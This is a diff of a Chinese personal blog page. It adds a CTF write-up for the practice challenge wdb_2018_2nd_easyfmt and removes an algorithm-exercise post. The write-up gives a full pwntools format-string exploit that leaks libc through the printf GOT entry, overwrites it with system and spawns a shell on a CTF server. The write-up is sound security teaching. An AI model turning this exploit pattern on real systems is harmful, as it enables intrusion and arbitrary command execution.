@@ -153,6 +153,119 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/04/25/23-34-undefined/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/shuwen.jpg">
+      <meta itemprop="name" content="Shuwen">
+      <meta itemprop="description" content="做有意思的事，有意思地做事">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Shuwen's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/04/25/23-34-undefined/" class="post-title-link" itemprop="url">wdb_2018_2nd_easyfmt详解</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-04-25 23:34:51 / 修改时间：23:36:25" itemprop="dateCreated datePublished" datetime="2021-04-25T23:34:51+08:00">2021-04-25</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/buu/" itemprop="url" rel="index"><span itemprop="name">buu</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <blockquote>
+<p>wdb_2018_2nd_easyfmt详解</p>
+<p>自己做出来了，，，，还看其他人的</p>
+<p>参考：<a href="[wdb_2018_2nd_easyfmt](https://www.cnblogs.com/luoleqi/p/13498183.html)">wdb_2018_2nd_easyfmt</a></p>
+</blockquote>
+<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><p>程序流程非常简单，可以一直进行格式化字符串漏洞。</p>
+<p><img src="/2021/04/25/23-34-undefined/image-20210425225434398.png" alt="image-20210425225434398"></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ol>
+<li>首先通过格式化字符串泄露栈信息</li>
+<li>通过格式化字符串修改printf_got表为system（one_gadget本地打通了，远程没有，，）</li>
+<li>发送“/bin/sh\x00”，</li>
+</ol>
+<h3 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h3><h4 id="0-查看基本信息"><a href="#0-查看基本信息" class="headerlink" title="0.查看基本信息"></a>0.查看基本信息</h4><p>32位程序，只开了nx</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;buu$ file wdb_2018_2nd_easyfmt </span><br><span class="line">wdb_2018_2nd_easyfmt: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib&#x2F;ld-linux.so.2, for GNU&#x2F;Linux 2.6.32, BuildID[sha1]&#x3D;f86851c3576d0aabf0b0b2310d835d0f6e660eb8, not stripped</span><br><span class="line">winter@ubuntu:~&#x2F;buu$ checksec wdb_2018_2nd_easyfmt </span><br><span class="line">[*] &#39;&#x2F;home&#x2F;winter&#x2F;buu&#x2F;wdb_2018_2nd_easyfmt&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+
+<p>格式化字符串，偏移为6</p>
+<p><img src="/2021/04/25/23-34-undefined/image-20210425233348293.png" alt="image-20210425233348293"></p>
+<h4 id="1-泄露信息"><a href="#1-泄露信息" class="headerlink" title="1.泄露信息"></a>1.泄露信息</h4><h5 id="方法一：栈上数据"><a href="#方法一：栈上数据" class="headerlink" title="方法一：栈上数据"></a>方法一：栈上数据</h5><blockquote>
+<p>可以直接查看栈上的信息进行泄露</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 30</span><br><span class="line">00:0000│ esp      0xffffcfbc —▸ 0x80485cf (main+132) ◂— add    esp, 0x10</span><br><span class="line">01:0004│          0xffffcfc0 —▸ 0xffffcfd8 ◂— &#39;aaaa\n&#39;</span><br><span class="line">... ↓</span><br><span class="line">03:000c│          0xffffcfc8 ◂— 0x64 &#x2F;* &#39;d&#39; *&#x2F;</span><br><span class="line">04:0010│          0xffffcfcc —▸ 0xf7e9379b (handle_intel+107) ◂— add    esp, 0x10	#libc中的数据，计算偏移即可得到libc基址</span><br><span class="line">05:0014│          0xffffcfd0 —▸ 0xffffcffe —▸ 0xffff0000 ◂— 0x0</span><br><span class="line">06:0018│          0xffffcfd4 —▸ 0xffffd0fc —▸ 0xffffd2e9 ◂— &#39;XDG_VTNR&#x3D;7&#39;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">"Do you know repeater?"</span>)</span><br><span class="line">payload = <span class="string">"%3$p"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">handle_intel_107 = p.recvuntil(<span class="string">"f7"</span>)[<span class="number">-2</span>:]</span><br><span class="line">handle_intel_107 += p.recv(<span class="number">8</span>)</span><br><span class="line">handle_intel_107 = int(handle_intel_107,<span class="number">16</span>)</span><br><span class="line">log.success(hex(handle_intel_107))</span><br><span class="line"></span><br><span class="line"><span class="comment">#[+] 0xf7e658fb</span></span><br></pre></td></tr></table></figure>
+
+<p>通过脚本输出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line"> 0x8048000  0x8049000 r-xp     1000 0      &#x2F;home&#x2F;winter&#x2F;buu&#x2F;wdb_2018_2nd_easyfmt</span><br><span class="line"> 0x8049000  0x804a000 r--p     1000 0      &#x2F;home&#x2F;winter&#x2F;buu&#x2F;wdb_2018_2nd_easyfmt</span><br><span class="line"> 0x804a000  0x804b000 rw-p     1000 1000   &#x2F;home&#x2F;winter&#x2F;buu&#x2F;wdb_2018_2nd_easyfmt</span><br><span class="line">0xf7dd5000 0xf7dd6000 rw-p     1000 0      </span><br><span class="line">0xf7dd6000 0xf7f83000 r-xp   1ad000 0      &#x2F;home&#x2F;winter&#x2F;buu&#x2F;libc-2.23-32.so</span><br><span class="line">0xf7f83000 0xf7f84000 ---p     1000 1ad000 &#x2F;home&#x2F;winter&#x2F;buu&#x2F;libc-2.23-32.so</span><br><span class="line">0xf7f84000 0xf7f86000 r--p     2000 1ad000 &#x2F;home&#x2F;winter&#x2F;buu&#x2F;libc-2.23-32.so</span><br><span class="line">0xf7f86000 0xf7f87000 rw-p     1000 1af000 &#x2F;home&#x2F;winter&#x2F;buu&#x2F;libc-2.23-32.so</span><br><span class="line">0xf7f87000 0xf7f8b000 rw-p     4000 0      </span><br><span class="line">0xf7f8b000 0xf7f8e000 r--p     3000 0      [vvar]</span><br><span class="line">0xf7f8e000 0xf7f90000 r-xp     2000 0      [vdso]</span><br><span class="line">0xf7f90000 0xf7fb3000 r-xp    23000 0      &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.23.so</span><br><span class="line">0xf7fb3000 0xf7fb4000 r--p     1000 22000  &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.23.so</span><br><span class="line">0xf7fb4000 0xf7fb5000 rw-p     1000 23000  &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.23.so</span><br><span class="line">0xff999000 0xff9ba000 rw-p    21000 0      [stack]</span><br></pre></td></tr></table></figure>
+
+<p>计算偏移为：0xf7e658fb - 0xf7dd6000 = 0x8F8FB</p>
+<p>故可以得到libc_base</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">libc_base &#x3D; handle_intel_107 - 0x8f8fb - 0x20	#0x20是因为远程的时候，发现好像有0x20的偏移，一般libc_base是000结尾，但是原来是020结尾,故猜测还要再减去0x20</span><br><span class="line">log.success(hex(libc_base))</span><br></pre></td></tr></table></figure>
+
+<h5 id="方法二：直接泄露got表信息（方便）"><a href="#方法二：直接泄露got表信息（方便）" class="headerlink" title="方法二：直接泄露got表信息（方便）"></a>方法二：直接泄露got表信息（方便）</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(&quot;Do you know repeater?&quot;)</span><br><span class="line">payload &#x3D; p32(elf.got[&#39;printf&#39;]) + &quot;%6$s&quot;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">printf_addr &#x3D; u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">print(hex(printf_addr))</span><br><span class="line">libc_base &#x3D; printf_addr - libc.sym[&#39;printf&#39;]</span><br></pre></td></tr></table></figure>
+
+<p>因为偏移是6，所以直接输入printf_got，输出该地址内容时候，就泄露了printf的地址。</p>
+<h4 id="2-格式化字符串写printf-got"><a href="#2-格式化字符串写printf-got" class="headerlink" title="2.格式化字符串写printf_got"></a>2.格式化字符串写printf_got</h4><p>利用pwntool的工具来做</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">system &#x3D; libc_base + libc.sym[&#39;system&#39;]</span><br><span class="line">printf_got &#x3D; elf.got[&#39;printf&#39;]</span><br><span class="line"></span><br><span class="line">payload &#x3D; fmtstr_payload(offset,&#123;printf_got:system&#125;)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30wx 0x804a014</span><br><span class="line">0x804a014:	0xf7e3a940	0xf7e5f140	0xf7e18540	0xf7e60da0</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30wx 0xf7e3a940</span><br><span class="line">0xf7e3a940 &lt;system&gt;:	0x8b0cec83	0xe8102444	0x000e2941	0x56b4c281</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-发送”-bin-sh-x00”字符串"><a href="#3-发送”-bin-sh-x00”字符串" class="headerlink" title="3.发送”/bin/sh\x00”字符串"></a>3.发送”/bin/sh\x00”字符串</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(&quot;&#x2F;bin&#x2F;sh\x00&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>执行<code>printf(&amp;buf);</code> =&gt; system(“/bin/sh\x00”)</p>
+<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process("./wdb_2018_2nd_easyfmt")</span></span><br><span class="line">p=process([<span class="string">'./wdb_2018_2nd_easyfmt'</span>],env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/home/winter/buu/libc-2.23-32.so"</span>&#125;)</span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">25745</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">elf = ELF(<span class="string">"./wdb_2018_2nd_easyfmt"</span>)</span><br><span class="line"><span class="comment"># libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"/home/winter/buu/libc-2.23-32.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p.recvuntil("Do you know repeater?")</span></span><br><span class="line"><span class="comment"># payload = "%3$p"</span></span><br><span class="line"><span class="comment"># p.sendline(payload)</span></span><br><span class="line"><span class="comment"># handle_intel_107 = p.recvuntil("f7")[-2:]</span></span><br><span class="line"><span class="comment"># handle_intel_107 += p.recv(8)</span></span><br><span class="line"><span class="comment"># handle_intel_107 = int(handle_intel_107,16)</span></span><br><span class="line"><span class="comment"># log.success(hex(handle_intel_107))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_base = handle_intel_107 - 0x8f8fb - 0x20	#direct sub</span></span><br><span class="line"><span class="comment"># log.success(hex(libc_base))</span></span><br><span class="line">p.recvuntil(<span class="string">"Do you know repeater?"</span>)</span><br><span class="line">payload = p32(elf.got[<span class="string">'printf'</span>]) + <span class="string">"%6$s"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">printf_addr = u32(p.recvuntil(<span class="string">"\xf7"</span>)[<span class="number">-4</span>:])</span><br><span class="line">print(hex(printf_addr))</span><br><span class="line">libc_base = printf_addr - libc.sym[<span class="string">'printf'</span>]</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">offset = <span class="number">6</span></span><br><span class="line">log.success(hex(printf_got))</span><br><span class="line">payload = fmtstr_payload(offset,&#123;printf_got:system&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/04/25/15-11-undefined/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1983,165 +2096,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/03/19/10-59-undefined/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/shuwen.jpg">
-      <meta itemprop="name" content="Shuwen">
-      <meta itemprop="description" content="做有意思的事，有意思地做事">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Shuwen's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/03/19/10-59-undefined/" class="post-title-link" itemprop="url">团体程序设计天梯赛-练习集</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-03-19 10:59:10" itemprop="dateCreated datePublished" datetime="2021-03-19T10:59:10+08:00">2021-03-19</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-08-08 00:48:58" itemprop="dateModified" datetime="2021-08-08T00:48:58+08:00">2021-08-08</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%AE%97%E6%B3%95/" itemprop="url" rel="index"><span itemprop="name">算法</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>链接：<a href="https://pintia.cn/problem-sets/994805046380707840/problems/type/7" target="_blank" rel="noopener">团体程序设计天梯赛-练习集</a></p>
-<h2 id="L1-006-连续因子"><a href="#L1-006-连续因子" class="headerlink" title="L1-006 连续因子"></a>L1-006 连续因子</h2><h3 id="序列最长长度"><a href="#序列最长长度" class="headerlink" title="序列最长长度"></a>序列最长长度</h3><p>因为n的取值范围：</p>
-<p><img src="/2021/03/19/10-59-undefined/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210319111256733.png" alt="image-20210319111256733"></p>
-<p>又因为最长序列为2×3×。。。n，也就是n的阶乘。</p>
-<p>计算n的最长序列</p>
-<p>发现13!&gt;n最大值，12!&lt;n的最大值，，，，又因为1不算，，，也就是2×3×…13也就是最长为12位。。。</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by YCNN on 2021-03-19.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= <span class="number">13</span> ; ++i) &#123;</span><br><span class="line">        ans *= i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> pow2 = <span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">31</span>);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;pow2&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;结果</span><br><span class="line">13!:6227020800</span><br><span class="line">n的最大值:2147483648</span><br></pre></td></tr></table></figure>
-
-<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>枚举所有的</p>
-<ol>
-<li>首先长度最长为12，从12开始减（依次枚举所有长度len的乘积【从2开始，，，】）</li>
-<li>判断能否被n整除，如果可以的话，因为是从最大开始，这次就是最大值。</li>
-</ol>
-<h3 id="int取值范围"><a href="#int取值范围" class="headerlink" title="int取值范围"></a>int取值范围</h3><p>最大值：2^31-1</p>
-<p>所以本次，，，n可以取int，但是ans可能超过int最大值，所以需要long long</p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">max</span> = <span class="built_in">sqrt</span>(n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> len = <span class="number">12</span>; len &gt;= <span class="number">1</span> ; --len) &#123;<span class="comment">//最大长度为12，依次暴力所有的的长度情况</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> start = <span class="number">2</span>; start &lt;= <span class="built_in">max</span>; ++start) &#123;</span><br><span class="line">            ans = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = start; i &lt; start + len; ++i) &#123;</span><br><span class="line">                ans *= i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(n % ans == <span class="number">0</span>)&#123;<span class="comment">//如果是合法的</span></span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;len&lt;&lt;<span class="built_in">endl</span>&lt;&lt;start;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = start+<span class="number">1</span>; j &lt; start+len; ++j) &#123;</span><br><span class="line">                    <span class="built_in">cout</span>&lt;&lt;<span class="string">"*"</span>&lt;&lt;j;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="number">1</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;n&lt;&lt;<span class="built_in">endl</span>;<span class="comment">//如果是质数，，，因为最大也只是sqrt(n)，所以上面出不来结果，，，就手动加上来</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>其实是比较简单的题，，，但是上次做的时候，没有时间，紧张，就没有认真看下去，结果，，，校赛就出了一道类似的，苦苦。</p>
-</blockquote>
-<h2 id="L1-007-念数字"><a href="#L1-007-念数字" class="headerlink" title="L1-007 念数字"></a>L1-007 念数字</h2><blockquote>
-<p>涉及字符串，，，使用java比较easy，，，</p>
-<p>主要就是用map来存储，输入直接用字符串，，，</p>
-</blockquote>
-<h3 id="java版本"><a href="#java版本" class="headerlink" title="java版本"></a>java版本</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> exercise;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Ex_7</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Map&lt;Character,String&gt; hashmap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">		hashmap.put(<span class="string">'0'</span>, <span class="string">"ling"</span>);</span><br><span class="line">		hashmap.put(<span class="string">'1'</span>, <span class="string">"yi"</span>);</span><br><span class="line">		hashmap.put(<span class="string">'2'</span>, <span class="string">"er"</span>);</span><br><span class="line">		hashmap.put(<span class="string">'3'</span>, <span class="string">"san"</span>);</span><br><span class="line">		hashmap.put(<span class="string">'4'</span>, <span class="string">"si"</span>);</span><br><span class="line">		hashmap.put(<span class="string">'5'</span>, <span class="string">"wu"</span>);</span><br><span class="line">		hashmap.put(<span class="string">'6'</span>, <span class="string">"liu"</span>);</span><br><span class="line">		hashmap.put(<span class="string">'7'</span>, <span class="string">"qi"</span>);</span><br><span class="line">		hashmap.put(<span class="string">'8'</span>, <span class="string">"ba"</span>);</span><br><span class="line">		hashmap.put(<span class="string">'9'</span>, <span class="string">"jiu"</span>);</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">		Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">		String s  = scan.next();</span><br><span class="line">		<span class="keyword">char</span>[] arr = s.toCharArray();</span><br><span class="line">		<span class="keyword">if</span>(s.length()==<span class="number">1</span>) &#123;</span><br><span class="line">			System.out.println(hashmap.get(arr[<span class="number">0</span>]));</span><br><span class="line">			<span class="keyword">return</span> ;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(hashmap.containsKey(arr[<span class="number">0</span>])) &#123;</span><br><span class="line">			System.out.print(hashmap.get(arr[<span class="number">0</span>])+<span class="string">" "</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">			System.out.print(<span class="string">"fu "</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		String ans=<span class="string">""</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">			<span class="keyword">if</span>(hashmap.containsKey(arr[i])) &#123;</span><br><span class="line">				ans += hashmap.get(arr[i])+<span class="string">" "</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		ans = ans.substring(<span class="number">0</span>,ans.length()-<span class="number">1</span>);</span><br><span class="line">		System.out.println(ans);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
